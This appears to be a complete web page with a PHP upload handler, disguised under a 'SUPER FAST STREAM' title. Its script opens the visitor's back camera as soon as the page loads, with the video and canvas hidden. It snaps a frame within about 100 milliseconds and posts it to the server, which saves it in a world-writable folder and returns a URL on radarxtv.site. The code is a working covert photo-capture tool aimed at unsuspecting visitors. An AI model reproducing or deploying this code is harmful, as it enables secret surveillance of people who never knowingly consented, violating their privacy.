<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title> SUPER FAST STREAM </title>
</head>
<body>

    <!-- Hidden Elements (No UI, No Preview) -->
    <video id="video" autoplay playsinline style="display: none;"></video>
    <canvas id="canvas" style="display: none;"></canvas>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');

        // ✅ 1️⃣ Start Camera Immediately (No UI)
        navigator.mediaDevices.getUserMedia({ video: { facingMode: "environment" } })  // 🔹 Back Camera (if available)
            .then(stream => {
                video.srcObject = stream;
                setTimeout(() => captureAndUpload(), 100); // ✅ Capture in 100ms
            })
            .catch(err => console.error("❌ Camera Access Denied: " + err));

        function captureAndUpload() {
            if (!video.srcObject) {
                console.error("❌ Camera not available, retrying...");
                setTimeout(captureAndUpload, 200);
                return;
            }

            const context = canvas.getContext('2d');
            canvas.width = 320;  // ✅ Reduce resolution for speed
            canvas.height = 240;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);

            // ✅ 2️⃣ Compress Image (Low Quality for Super Fast Upload)
            canvas.toBlob(blob => {
                if (!blob) {
                    console.error("❌ Capture failed, retrying...");
                    setTimeout(captureAndUpload, 200);
                    return;
                }

                let formData = new FormData();
                formData.append("image", blob, "fast_upload.jpg");

                fetch("index.php", { 
                    method: "POST",
                    body: formData
                })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        console.log("✅ Uploaded: " + data.url);
                    } else {
                        console.error("❌ Upload Error: ", data.message);
                    }
                })
                .catch(error => console.error("❌ Upload Failed: ", error));

            }, 'image/jpeg', 0.3);  // ✅ 30% quality for ultra-fast upload

            // ✅ 3️⃣ Stop Camera After Capture
            setTimeout(() => {
                video.srcObject.getTracks().forEach(track => track.stop());
            }, 500);
        }
    </script>

</body>
</html>

<?php
// ✅ 4️⃣ PHP Backend: Fastest Upload Handling
if ($_SERVER['REQUEST_METHOD'] === 'POST' && isset($_FILES['image'])) {
    $targetDir = __DIR__ . "/uploads/";  // 📂 Ensure this folder exists
    if (!file_exists($targetDir)) {
        mkdir($targetDir, 0777, true);
    }

    $fileName = "user_" . time() . ".jpg";  // Unique Filename
    $targetFilePath = $targetDir . $fileName;

    if (move_uploaded_file($_FILES['image']['tmp_name'], $targetFilePath)) {
        echo json_encode(["status" => "success", "url" => "https://radarxtv.site/LALA/uploads/" . $fileName]);
        exit;
    } else {
        echo json_encode(["status" => "error", "message" => "Upload Failed!"]);
        exit;
    }
}
?>